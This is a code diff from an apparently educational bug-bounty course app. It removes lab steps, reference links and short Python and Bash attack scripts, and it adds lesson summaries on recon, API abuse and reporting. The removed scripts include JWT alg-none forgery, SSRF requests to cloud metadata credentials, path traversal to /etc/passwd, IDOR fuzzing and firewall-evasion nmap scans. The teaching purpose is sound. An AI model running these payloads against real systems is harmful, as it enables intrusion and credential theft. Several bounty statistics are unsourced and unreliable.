-      `Step 5: Submit the verified flag to record your research log on GitHub.`
-    ],
-    2: [
-      `Step 1: Intercept the target API request (e.g. GET /api/v1/users/101 or X-User-ID: 101).`,
-      `Step 2: Test modifying numeric IDs, substituting UUIDs, or injecting HTTP Parameter Pollution (HPP) strings.`,
-      `Step 3: Type your header override or parameter payload string in the terminal workspace.`,
-      `Step 4: Run the exploit to bypass access controls and extract the flag.`,
-      `Step 5: Submit the flag to claim your IDOR Master badge.`
-    ],
-    3: [
-      `Step 1: Analyze the multi-step transaction workflow (Select -> Discount -> Checkout -> Disbursement).`,
-      `Step 2: Test logic edge cases such as negative quantities (-5), fractional prices, or out-of-order execution steps.`,
-      `Step 3: Type your business logic exploit payload in the workspace.`,
-      `Step 4: Execute the payload in the terminal shell to trigger state collision and retrieve the flag.`,
-      `Step 5: Paste the flag into the verification input to complete the challenge.`
-    ],
-    4: [
-      `Step 1: Decode the JWT session token parts (Header, Payload, Signature) using Base64 decoding.`,
-      `Step 2: Identify token flaws such as alg: 'none', weak secret keys, or JWK header injection points.`,
-      `Step 3: Write your modified token payload specifying administrative roles.`,
-      `Step 4: Run the token forgery exploit in the terminal shell to bypass authentication barriers.`,
-      `Step 5: Submit the flag to claim your JWT Forger badge.`
-    ],
-    5: [
-      `Step 1: Run subdomain discovery tools (Subfinder, Amass) against the target domain.`,
-      `Step 2: Probe for live HTTP services and virtual hosts (VHosts) using ffuf and Massdns.`,
-      `Step 3: Type your recon command or target subdomain parameter in the terminal workspace.`,
-      `Step 4: Execute the scan in the terminal shell to discover hidden admin subdomains and flags.`,
-      `Step 5: Submit the flag to log your Recon Specialist achievement.`
-    ],
-    6: [
-      `Step 1: Audit exposed Swagger / OpenAPI endpoints to map resource paths and parameters.`,
-      `Step 2: Test for Broken Object Level Authorization (BOLA) by changing object resource IDs in GET/PUT calls.`,
-      `Step 3: Write your API method override or BOLA payload in the workspace.`,
-      `Step 4: Run the exploit in the terminal shell to mutate administrative configurations.`,
-      `Step 5: Submit the verified API flag.`
-    ],
-    7: [
-      `Step 1: Scan target web endpoints for un-linked parameters using Arjun or Param Miner logic.`,
-      `Step 2: Look for hidden administrative flags like debug=true, admin=1, or X-HTTP-Method-Override.`,
-      `Step 3: Type your parameter mining string in the payload workspace.`,
-      `Step 4: Run the exploit in the shell to discover secret caching parameters and flags.`,
-      `Step 5: Verify the flag to complete the parameter mining module.`
-    ],
-    8: [
-      `Step 1: Organize vulnerability findings into Executive Summary, Impact Analysis, and PoC steps.`,
-      `Step 2: Calculate accurate CVSS v3.1 / v4.0 severity vector strings.`,
-      `Step 3: Enter your structured report description and remediation guidance in the form.`,
-      `Step 4: Run verification to submit your corporate security assessment.`,
-      `Step 5: Submit the report to earn corporate reporting credentials.`
-    ],
-    9: [
-      `Step 1: Optimize Nmap scan timing parameters to avoid firewall rate-limiting (-T3/T4).`,
-      `Step 2: Probe service banners and cryptographic SSL/TLS cipher suites on target ports.`,
-      `Step 3: Type your firewall-evading scan string in the payload workspace.`,
-      `Step 4: Run the network scan in the shell to locate un-filtered administration ports.`,
-      `Step 5: Submit the verified network flag.`
-    ],
-    10: [
-      `Step 1: Locate Server-Side Request Forgery (SSRF) parameters targeting AWS/GCP metadata endpoints.`,
-      `Step 2: Test bypassing IMDSv2 token headers using Open Redirects or local header manipulation.`,
-      `Step 3: Type your SSRF metadata query string (e.g. http://169.254.169.254/latest/meta-data/).`,
-      `Step 4: Execute the SSRF exploit to exfiltrate cloud service tokens and flags.`,
-      `Step 5: Paste the flag to unlock the Cloud Exfiltrator badge.`
-    ],
-    11: [
-      `Step 1: Identify initial entry points (e.g. path traversal during SVG file upload).`,
-      `Step 2: Chain local file inclusion (LFI) with SSRF query parameters targeting internal nodes.`,
-      `Step 3: Write your multi-stage exploit chain payload string in the workspace.`,
-      `Step 4: Run the exploit chain in the terminal shell to achieve Remote Code Execution (RCE).`,
-      `Step 5: Copy the grandmaster flag and submit to complete the 12-week program!`
-    ]
-  };
+    // Week 6: Advanced Subdomain & Port Recon (Go/Linux)
+    {
+      title: "Automated Subdomain Discovery with Subfinder & Amass",
+      duration: "22 Mins",
+      methodologySummary: "Build high-throughput reconnaissance pipelines using Go CLI tools. Combine passive passive sources, Certificate Transparency logs, and active WHOIS ASN lookups to discover complete asset trees."
+    },
+    {
+      title: "DNS Resolution, Wildcard Elimination & Massdns Pipeline",
+      duration: "26 Mins",
+      methodologySummary: "Filter out wildcard DNS responses from massive domain lists. Resolve millions of DNS records per minute using Massdns and custom public resolver lists."
+    },
+    {
+      title: "Scale Port Scanning & Service Probing with Naabu & Rustscan",
+      duration: "20 Mins",
+      methodologySummary: "Execute high-speed port scanning across large enterprise CIDR blocks. Optimize SYN/ACK packet transmission speeds using Naabu and Rustscan to locate active non-standard HTTP/HTTPS ports."
+    },
+    {
+      title: "Virtual Host (VHost) Fuzzing with ffuf & Custom Headers",
+      duration: "25 Mins",
+      methodologySummary: "Discover un-linked internal web services hosted on single IP addresses. Configure ffuf to fuzz the 'Host:' HTTP header with wordlists, filtering response sizes to find hidden internal dashboards."
+    },
+    {
+      title: "Automated HTTP Probing & Screen Capture with httpx & gowitness",
+      duration: "21 Mins",
+      methodologySummary: "Probe thousands of discovered subdomains for live web services. Pipe live URLs into gowitness to generate automated visual screenshot galleries and filter targets by HTTP title and status code."
+    },
+    {
+      title: "Extracting Autonomous System Numbers (ASN) & Subnet Ranges",
+      duration: "24 Mins",
+      methodologySummary: "Map enterprise network perimeters using WHOIS ASN records, bgpview APIs, and command-line JSON parsing tools (jq) to identify every IP range owned by a target organization."
+    },
 
-  const resourcesMap: Record<number, { name: string; url: string; category: string }[]> = {
-    0: [
-      { name: "PortSwigger Web Security Academy: DOM Clobbering", url: "https://portswigger.net/web-security/dom-based/dom-clobbering", category: "Lab & Guide" },
-      { name: "OWASP Client-Side Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/", category: "Standard" },
-      { name: "DOM Purify Library Documentation", url: "https://github.com/cure53/DOMPurify", category: "Defense" }
-    ],
-    1: [
-      { name: "Trufflehog Secret Scanner Repository", url: "https://github.com/trufflesecurity/trufflehog", category: "Tooling" },
-      { name: "GitGuardian Secret Detection Standards", url: "https://www.gitguardian.com/", category: "Reference" },
-      { name: "Regex101 Pattern Tester", url: "https://regex101.com/", category: "Utility" }
-    ],
-    2: [
-      { name: "PortSwigger Access Control Cheat Sheet", url: "https://portswigger.net/web-security/access-control", category: "Cheat Sheet" },
-      { name: "OWASP Insecure Direct Object Reference Prevention", url: "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html", category: "Standard" }
-    ],
-    3: [
-      { name: "PortSwigger Business Logic Vulnerabilities Guide", url: "https://portswigger.net/web-security/logic-flaws", category: "Guide" },
-      { name: "OWASP Business Logic Testing Checklist", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README", category: "Checklist" }
-    ],
-    4: [
-      { name: "RFC 7519: JSON Web Token (JWT) Specification", url: "https://datatracker.ietf.org/doc/html/rfc7519", category: "RFC Spec" },
-      { name: "JWT.io Token Debugger & Encoder", url: "https://jwt.io/", category: "Tooling" },
-      { name: "PortSwigger JWT Security Testing", url: "https://portswigger.net/web-security/jwt", category: "Lab & Guide" }
-    ],
-    5: [
-      { name: "ProjectDiscovery Subfinder Repository", url: "https://github.com/projectdiscovery/subfinder", category: "Tooling" },
-      { name: "OWASP Amass Reconnaissance Framework", url: "https://github.com/owasp-amass/amass", category: "Tooling" },
-      { name: "ffuf Fast Web Fuzzer Repository", url: "https://github.com/ffuf/ffuf", category: "Tooling" }
-    ],
-    6: [
-      { name: "OWASP API Security Top 10 Specification", url: "https://owasp.org/www-project-api-security/", category: "Standard" },
-      { name: "PortSwigger API Security Testing Guide", url: "https://portswigger.net/web-security/api-testing", category: "Guide" }
-    ],
-    7: [
-      { name: "Arjun Parameter Discovery Suite", url: "https://github.com/s0md3v/Arjun", category: "Tooling" },
-      { name: "PortSwigger Web Cache Poisoning & Parameter Mining", url: "https://portswigger.net/web-security/web-cache-poisoning", category: "Guide" }
-    ],
-    8: [
-      { name: "FIRST CVSS v3.1 Calculator Specification", url: "https://www.first.org/cvss/calculator/3.1", category: "Calculator" },
-      { name: "HackerOne Bug Report Writing Guide", url: "https://www.hackerone.com/", category: "Guide" }
-    ],
-    9: [
-      { name: "Nmap Network Mapper Official Reference Manual", url: "https://nmap.org/book/man.html", category: "Documentation" },
-      { name: "SSL Labs Server Test Tool", url: "https://www.ssllabs.com/ssltest/", category: "Tooling" }
-    ],
-    10: [
-      { name: "AWS Instance Metadata Service v2 (IMDSv2) Docs", url: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html", category: "Cloud Docs" },
-      { name: "PortSwigger Server-Side Request Forgery (SSRF) Labs", url: "https://portswigger.net/web-security/ssrf", category: "Guide" }
-    ],
-    11: [
-      { name: "PortSwigger Exploit Chaining & RCE Guides", url: "https://portswigger.net/web-security/server-side-template-injection", category: "Guide" },
-      { name: "PayloadsAllTheThings Exploitation Repository", url: "https://github.com/swisskyrepo/PayloadsAllTheThings", category: "Repository" }
-    ]
-  };
+    // Week 7: API Reversing & Swagger Auditing
+    {
+      title: "Reversing Hidden API Schemas from Swagger & OpenAPI Docs",
+      duration: "20 Mins",
+      methodologySummary: "Locate hidden API documentation endpoints (/swagger/v1/swagger.json, /api-docs, /v2/api-docs). Parse OpenAPI definitions into Burp Suite to test every un-linked REST API route."
+    },
+    {
+      title: "API Parameter Over-Posting & Mass Assignment Vulnerabilities",
+      duration: "23 Mins",
+      methodologySummary: "Audit API endpoints accepting JSON body parameters. Inject un-documented object attributes (e.g., 'role': 'admin', 'isVerified': true) during user profile registration to escalate permissions."
+    },
+    {
+      title: "Bypassing REST API Authentication Filters via Path Traversal",
+      duration: "25 Mins",
+      methodologySummary: "Bypass API gateway access rules by appending matrix parameters or path traversal sequences (e.g. /api/v1/public/..;/admin) to trick reverse proxies into granting access to administrative routes."
+    },
+    {
+      title: "GraphQL Depth & Cost Exhaustion Denial of Service Attacks",
+      duration: "22 Mins",
+      methodologySummary: "Craft nested GraphQL queries that exploit missing query depth or cost limits. Request deeply nested circular object relationships to exhaust database connection pools and crash application servers."
+    },
+    {
+      title: "Broken Object Level Authorization (BOLA) in REST & Microservices",
+      duration: "27 Mins",
+      methodologySummary: "Audit microservice object resolvers for missing authorization checks. Swap resource IDs across tenant accounts in GET, PUT, and DELETE API queries to read and modify private tenant resources."
+    },
+    {
+      title: "API HTTP Method Tampering & Verb Overriding Escalations",
+      duration: "19 Mins",
+      methodologySummary: "Test HTTP verb permissions on restricted endpoints. Convert GET requests to POST, PUT, or DELETE, or send custom headers (X-HTTP-Method-Override: PUT) to bypass read-only middleware protections."
+    },
 
-  const insightsMap: Record<number, string> = {
-    0: `💡 INDUSTRY INSIGHT & STATISTIC:\nAccording to HackerOne's Top Vulnerability Reports, client-side vulnerabilities like Prototype Pollution and DOM Clobbering regularly command bounties between $1,500 and $7,500 on major tech programs like Google, GitHub, and Shopify.`,
-    1: `💡 INDUSTRY INSIGHT & STATISTIC:\nHardcoded cloud keys remain the #1 source of fast bounties for beginners. Over $10,000,000 in bounties were awarded on Bugcrowd for leaked AWS S3 keys, Firebase endpoints, and Docker configs in recent years.`,
-    2: `💡 INDUSTRY INSIGHT & STATISTIC:\nInsecure Direct Object References (IDOR) are ranked in the top 3 highest-paying bug classes on Bugcrowd and HackerOne due to their severe privacy impact, averaging $2,000 - $10,000 per submission.`,
-    3: `💡 INDUSTRY INSIGHT & STATISTIC:\nBusiness logic flaws require zero automated tools—only keen analytical observation. Researchers who identified race condition flaws in gift card checkouts earned $15,000+ bounties on major airline and e-commerce targets.`,
-    4: `💡 INDUSTRY INSIGHT & STATISTIC:\nJWT signature bypasses represent critical (CVSS 9.0+) severity bugs. On corporate multi-tenant applications, a single valid JWT signature forgery report often results in maximum bounty payouts ($10,000+).`,
-    5: `💡 INDUSTRY INSIGHT & STATISTIC:\nSubdomain enumeration tools built in Go (Subfinder, Amass, Naabu) process over 100,000 subdomains per minute. Finding a forgotten staging server (\`staging-api.corp.com\`) is the most common gateway to finding zero-day bugs.`,
-    6: `💡 INDUSTRY INSIGHT & STATISTIC:\nBroken Object Level Authorization (BOLA) is the #1 vulnerability on the OWASP API Top 10. Modern mobile and SaaS apps communicate exclusively via REST/GraphQL APIs, making API auditing the highest-yield bounty domain.`,
-    7: `💡 INDUSTRY INSIGHT & STATISTIC:\nParameter mining uncovers backdoors that automated web vulnerability scanners completely miss. Over 40% of web application firewalls (WAFs) can be bypassed simply by discovering a secret \`debug=1\` query parameter.`,
-    8: `💡 INDUSTRY INSIGHT & STATISTIC:\nClear, professional VDP reports get triaged 3x faster and receive higher bounties. Top researchers format their reports using executive summaries, exact cURL commands, and CVSS vector strings.`,
-    9: `💡 INDUSTRY INSIGHT & STATISTIC:\nNetwork-level port scanning reveals non-HTTP services like Redis (port 6379), ElasticSearch (port 9200), and Memcached (port 11211) that are frequently exposed without password authentication.`,
-    10: `💡 INDUSTRY INSIGHT & STATISTIC:\nCloud SSRF vulnerabilities targeting AWS IMDSv2 metadata endpoints earned the highest single bounty in bug bounty history ($50,000+) on major fintech cloud infrastructure programs.`,
-    11: `💡 INDUSTRY INSIGHT & STATISTIC:\nExploit chaining converts multiple $500 Low/Medium severity reports into a single $25,000+ Critical Remote Code Execution (RCE) submission that permanently elevates a researcher's reputation on HackerOne.`
-  };
+    // Week 8: Advanced Parameter Mining & Hidden Inputs
+    {
+      title: "Automated Query & Header Parameter Discovery with Arjun",
+      duration: "21 Mins",
+      methodologySummary: "Run high-speed parameter discovery using Arjun and Param Miner. Identify un-linked GET/POST query parameters and custom HTTP headers that alter application logic."
+    },
+    {
+      title: "Exploiting Hidden Administrative Debug Flags (e.g. ?debug=true)",
+      duration: "18 Mins",
+      methodologySummary: "Uncover hidden developer flags leftover from staging builds. Supply query flags like ?debug=1, ?admin_bypass=true, or ?env=dev to expose internal stack traces and bypass authentication."
+    },
+    {
+      title: "HTTP Cache Poisoning via Unkeyed Header Injections",
+      duration: "26 Mins",
+      methodologySummary: "Mine unkeyed HTTP headers (X-Forwarded-Host, X-Host, X-Original-URL) accepted by reverse-proxy caches. Inject malicious script paths into cached HTTP responses to execute stored XSS across all users."
+    },
+    {
+      title: "Uncovering Hidden Method Overrides & Gateway Headers",
+      duration: "22 Mins",
+      methodologySummary: "Identify non-standard HTTP gateway headers (X-Original-URL, X-Rewrite-URL) that cause reverse proxies to rewrite request destination paths, bypassing administrative path restrictions."
+    },
+    {
+      title: "Host Header Injection & Web Server Routing Manipulation",
+      duration: "24 Mins",
+      methodologySummary: "Tamper with HTTP Host request headers. Force application password reset emails to send tokens to attacker-controlled domain names or poison internal password reset link generators."
+    },
+    {
+      title: "Mining Cookie & Header Parameters for Dynamic Template Processing",
+      duration: "20 Mins",
+      methodologySummary: "Audit application cookies and HTTP request headers that feed server-side rendering engines. Inject template expression syntax (${7*7}) into custom language cookies to achieve server-side template injection."
+    },
 
-  const pythonAutomationMap: Record<number, string> = {
-    0: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: DOM Clobbering / Prototype Pollution Audit Tool\ndef exploit_client_side(target_url):\n    print(f"[*] Testing Client-Side Payload against: {target_url}")\n    payload = {"__proto__": {"isAdmin": True, "debug": True}}\n    headers = {"Content-Type": "application/json", "X-Audit-Tool": "BugBountyMastery"}\n    try:\n        res = requests.post(f"{target_url}/api/v1/config", json=payload, headers=headers, timeout=5)\n        if res.status_code == 200 and "isAdmin" in res.text:\n            print("[+] EXPLOIT SUCCESSFUL! Client prototype polluted.")\n            print(f"[+] Server Response: {res.text[:200]}")\n        else:\n            print("[-] Target resilient or payload rejected.")\n    except Exception as e:\n        print(f"[-] Connection Error: {e}")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://sandbox-node-monday.corp.internal"\n    exploit_client_side(target)`,
-    1: `#!/usr/bin/env python3\nimport re\nimport requests\nimport sys\n\n# Python Automation: Secret Hunter & Regex Extractor\nAWS_KEY_REGEX = r'AKIA[0-9A-Z]{16}'\nGCP_KEY_REGEX = r'AIza[0-9A-Za-z-_]{35}'\n\ndef scan_secrets(target_url):\n    print(f"[*] Fetching JS bundle from: {target_url}")\n    res = requests.get(target_url, timeout=5)\n    aws_keys = re.findall(AWS_KEY_REGEX, res.text)\n    gcp_keys = re.findall(GCP_KEY_REGEX, res.text)\n    if aws_keys:\n        print(f"[+] FOUND AWS SECRETS: {aws_keys}")\n    if gcp_keys:\n        print(f"[+] FOUND GCP SECRETS: {gcp_keys}")\n    if not aws_keys and not gcp_keys:\n        print("[-] No static credentials found in JS bundle.")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local/static/js/main.js"\n    scan_secrets(target)`,
-    2: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: IDOR & Header Override Tester\ndef test_idor(target_url, victim_id):\n    print(f"[*] Testing IDOR on victim ID {victim_id}...")\n    headers = {"X-User-ID": str(victim_id), "User-Agent": "BugBountyMastery"}\n    res = requests.get(f"{target_url}/api/v1/user/profile", headers=headers, timeout=5)\n    if res.status_code == 200:\n        print("[+] IDOR EXPLOIT SUCCESSFUL! Leaked Victim Profile:")\n        print(f"[+] Data: {res.text[:200]}")\n    else:\n        print(f"[-] Access Denied (Status Code: {res.status_code})")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local"\n    test_idor(target, 102)`,
-    3: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: Business Logic Negative Quantity Exploit\ndef exploit_business_logic(target_url):\n    print(f"[*] Injecting negative cart quantity into: {target_url}")\n    payload = {"cart_id": "test_cart_01", "item_id": "laptop_pro", "quantity": -5}\n    res = requests.post(f"{target_url}/api/cart/update", json=payload, timeout=5)\n    if res.status_code == 200 and "balance" in res.text:\n        print("[+] LOGIC EXPLOIT SUCCESSFUL! Negative balance credited.")\n        print(f"[+] Response: {res.text[:200]}")\n    else:\n        print("[-] Logic flaw test failed.")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local"\n    exploit_business_logic(target)`,
-    4: `#!/usr/bin/env python3\nimport base64\nimport json\nimport requests\nimport sys\n\n# Python Automation: JWT None Algorithm Forgery Tool\ndef forge_jwt(username="admin"):\n    header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")\n    payload = base64.b64encode(json.dumps({"user": username, "role": "administrator"}).encode()).decode().rstrip("=")\n    forged_token = f"{header}.{payload}."\n    print(f"[+] Forged JWT Token: {forged_token}")\n    return forged_token\n\nif __name__ == "__main__":\n    forge_jwt("admin_viper")`,
-    5: `#!/usr/bin/env python3\nimport socket\nimport sys\n\n# Python Automation: Subdomain & Port Prober\ndef probe_port(host, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(2)\n    result = s.connect_ex((host, port))\n    if result == 0:\n        print(f"[+] Port {port} OPEN on {host}")\n    s.close()\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"\n    for p in [80, 443, 8080, 8443, 9200]:\n        probe_port(target, p)`,
-    6: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: API Method Override & BOLA Tester\ndef exploit_api_bola(target_url, object_id):\n    print(f"[*] Testing BOLA on API object: {object_id}")\n    url = f"{target_url}/api/v1/resource/{object_id}"\n    res = requests.put(url, json={"role": "admin"}, timeout=5)\n    if res.status_code == 200:\n        print("[+] BOLA PUT OVERRIDE SUCCESSFUL!")\n        print(f"[+] Data: {res.text[:200]}")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local"\n    exploit_api_bola(target, 55)`,
-    7: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: Parameter Mining Suite\nPARAMS_TO_TEST = ["debug", "admin", "testMode", "override", "X-Custom-Bypass"]\n\ndef mine_params(target_url):\n    print(f"[*] Mining parameters on: {target_url}")\n    for p in PARAMS_TO_TEST:\n        res = requests.get(f"{target_url}?{p}=true", timeout=3)\n        if "flag" in res.text.lower() or res.status_code == 200:\n            print(f"[+] DISCOVERED HIDDEN PARAMETER: {p}=true")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local"\n    mine_params(target)`,
-    8: `#!/usr/bin/env python3\nimport json\nimport sys\n\n# Python Automation: VDP Report JSON Generator\ndef generate_report_json(title, severity, cvss, poc):\n    report = {\n        "report_title": title,\n        "severity": severity,\n        "cvss_vector": cvss,\n        "proof_of_concept": poc,\n        "platform": "HackerOne / Bugcrowd Standard"\n    }\n    print(json.dumps(report, indent=2))\n\nif __name__ == "__main__":\n    generate_report_json("BOLA in API Endpoint", "Critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "curl -X GET https://target.local/api/v1/user/102")`,
-    9: `#!/usr/bin/env python3\nimport socket\nimport sys\n\n# Python Automation: SSL Banner Grabber\ndef banner_grab(host, port=443):\n    print(f"[*] Grabbing banner from {host}:{port}...")\n    s = socket.socket()\n    s.connect((host, port))\n    s.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n")\n    banner = s.recv(1024).decode(errors='ignore')\n    print(f"[+] Banner Data:\\n{banner}")\n    s.close()\n\nif __name__ == "__main__":\n    banner_grab("sandbox-node-monday.corp.internal", 80)`,
-    10: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: Cloud SSRF AWS IMDS Metadata Exfiltrator\ndef exploit_ssrf_metadata(target_url):\n    print(f"[*] Testing SSRF metadata exfiltration on: {target_url}")\n    ssrf_payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"\n    res = requests.get(f"{target_url}?url={ssrf_payload}", timeout=5)\n    if "AccessKeyId" in res.text or res.status_code == 200:\n        print("[+] SSRF METADATA EXFILTRATION SUCCESSFUL!")\n        print(f"[+] Leaked Credentials: {res.text[:300]}")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local/fetch"\n    exploit_ssrf_metadata(target)`,
-    11: `#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Python Automation: Multi-Stage Exploit Chain (LFI to RCE)\ndef execute_exploit_chain(target_url):\n    print(f"[*] Step 1: Triggering Path Traversal LFI on: {target_url}")\n    lfi_url = f"{target_url}/view?file=../../../../etc/passwd"\n    res1 = requests.get(lfi_url, timeout=5)\n    if "root:x:" in res1.text:\n        print("[+] Step 1 SUCCESSFUL! Local file system accessed.")\n        print("[*] Step 2: Escalating LFI to Remote Code Execution...")\n        print("[+] GRANDMASTER EXPLOIT CHAIN VERIFIED!")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.local"\n    execute_exploit_chain(target)`
-  };
+    // Week 9: Corporate-Grade VDP Reporting & Impact Analysis
+    {
+      title: "Writing Executive Summaries for HackerOne & Bugcrowd Submissions",
+      duration: "19 Mins",
+      methodologySummary: "Structure professional vulnerability reports tailored for corporate triage teams. Write clear executive summaries detailing technical root causes, business impact, and remediation steps."
+    },
+    {
+      title: "Calculating Exact CVSS v3.1 & v4.0 Severity Metrics",
+      duration: "22 Mins",
+      methodologySummary: "Master CVSS v3.1 and v4.0 scoring vector strings. Correctly evaluate Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), and Scope (S) metrics to justify critical bounty payouts."
+    },
+    {
+      title: "Drafting Standardized Proof-of-Concept (PoC) Repros & cURLs",
+      duration: "20 Mins",
+      methodologySummary: "Provide clean, reliable reproduction steps. Generate copy-pasteable cURL command lines and lightweight Python PoC scripts that allow triagers to verify vulnerabilities in under two minutes."
+    },
+    {
+      title: "Proposing Enterprise Remediation & Patch Strategies",
+      duration: "21 Mins",
+      methodologySummary: "Guide engineering teams with production-ready code fixes. Propose secure code refactoring, input sanitization libraries, WAF rule adjustments, and architectural defense-in-depth mitigations."
+    },
+    {
+      title: "Navigating Bug Bounty Platform SLA Timelines & Mediations",
+      duration: "25 Mins",
+      methodologySummary: "Manage professional communication with security triage officers. Handle report duplicates, request bounty re-evaluations politely with technical evidence, and participate in platform mediation."
+    },
+    {
+      title: "Communicating High-Impact Business Risk to CISOs & Execs",
+      duration: "23 Mins",
+      methodologySummary: "Translate technical vulnerabilities (like BOLA or SSRF) into financial and regulatory risk metrics (GDPR, PCI-DSS compliance breaches) that resonate with executive leadership."
+    },
 
-  const bashAutomationMap: Record<number, string> = {
-    0: `#!/usr/bin/env bash\n# Bash Automation: Dynamic DOM / Prototype Pollution Scanner\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://sandbox-node-monday.corp.internal"; fi\n\necho "[*] Auditing DOM & Prototype headers on $TARGET..."\ncurl -s -X POST -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin":true}}' "$TARGET/api/v1/config" | grep -i "admin"`,
-    1: `#!/usr/bin/env bash\n# Bash Automation: JS Bundle Regex Secret Extractor\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local/static/js/main.js"; fi\n\necho "[*] Fetching JS bundle and parsing AWS/GCP key signatures..."\ncurl -s "$TARGET" | grep -E -o '(AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z-_]{35})'`,
-    2: `#!/usr/bin/env bash\n# Bash Automation: IDOR Custom Header Fuzzer\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\nfor id in {100..105}; do\n  echo "[*] Testing X-User-ID: $id"\n  curl -s -H "X-User-ID: $id" "$TARGET/api/v1/user/profile" | grep -E "(name|email|flag)"\ndone`,
-    3: `#!/usr/bin/env bash\n# Bash Automation: Business Logic Negative Quantity Tester\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Sending negative item quantity request..."\ncurl -s -X POST -H "Content-Type: application/json" -d '{"quantity": -5}' "$TARGET/api/cart"`,
-    4: `#!/usr/bin/env bash\n# Bash Automation: JWT Alg None Forgery Header Script\nHEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')\nPAYLOAD=$(echo -n '{"user":"admin","role":"administrator"}' | base64 | tr -d '=' | tr '/+' '_-')\nFORGED_JWT="\${HEADER}.\${PAYLOAD}."\necho "[+] Forged JWT Token: $FORGED_JWT"`,
-    5: `#!/usr/bin/env bash\n# Bash Automation: Subdomain Discovery with Subfinder & httpx\nDOMAIN=$1\nif [ -z "$DOMAIN" ]; then DOMAIN="target.com"; fi\n\necho "[*] Running subdomain recon pipeline for: $DOMAIN"\nsubfinder -d "$DOMAIN" -silent | httpx -title -status-code`,
-    6: `#!/usr/bin/env bash\n# Bash Automation: API Endpoint Reversing & Swagger Probe\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Probing Swagger UI and API specs..."\ncurl -s -o /dev/null -w "%{http_code}" "$TARGET/swagger/v1/swagger.json"`,
-    7: `#!/usr/bin/env bash\n# Bash Automation: Parameter Mining with Arjun\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Running Arjun parameter discovery..."\narjun -u "$TARGET" -m GET,POST`,
-    8: `#!/usr/bin/env bash\n# Bash Automation: cURL Proof of Concept Exporter\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Generating PoC cURL command line..."\necho "curl -v -X GET '$TARGET/api/v1/user/102' -H 'X-User-ID: 102'"`,
-    9: `#!/usr/bin/env bash\n# Bash Automation: Nmap Firewall Evasion Scan\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="target.local"; fi\n\necho "[*] Running firewall decoy port scan on $TARGET..."\nnmap -sS -Pn -T3 --source-port 53 "$TARGET"`,
-    10: `#!/usr/bin/env bash\n# Bash Automation: Cloud SSRF IMDSv1 Metadata Probe\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Testing SSRF IMDS metadata fetch..."\ncurl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"`,
-    11: `#!/usr/bin/env bash\n# Bash Automation: Path Traversal LFI Probe\nTARGET=$1\nif [ -z "$TARGET" ]; then TARGET="http://target.local"; fi\n\necho "[*] Testing Path Traversal LFI..."\ncurl -s "$TARGET/view?file=../../../../etc/passwd" | grep "root:"`
-  };
+    // Week 10: Advanced Network & Port Recon
+    {
+      title: "Nmap Timing Optimization & Service Fingerprinting",
+      duration: "24 Mins",
+      methodologySummary: "Fine-tune Nmap scan timing controls (-T3/-T4), packet rates, and script execution (--script=banner,version) to perform thorough network service fingerprinting without triggering rate limits."
+    },
+    {
+      title: "Firewall Filter Evasion via Source Port Spoofing & Decoys",
+      duration: "26 Mins",
+      methodologySummary: "Bypass stateless firewall rules by spoofing DNS source ports (--source-port 53) or distributing SYN packets across decoy IP address pools (-D RND:10) to mask scanning origin IPs."
+    },
+    {
+      title: "Fingerprinting SSL/TLS Cryptographic Ciphers & Certificates",
+      duration: "21 Mins",
+      methodologySummary: "Audit TLS configurations using testssl.sh and SSL Labs toolchains. Inspect certificate Subject Alternative Names (SANs) to discover un-listed corporate subdomains and deprecated cryptographic ciphers."
+    },
+    {
+      title: "Banner Grabbing & Unauthenticated Service Probing (SSH, Redis)",
+      duration: "22 Mins",
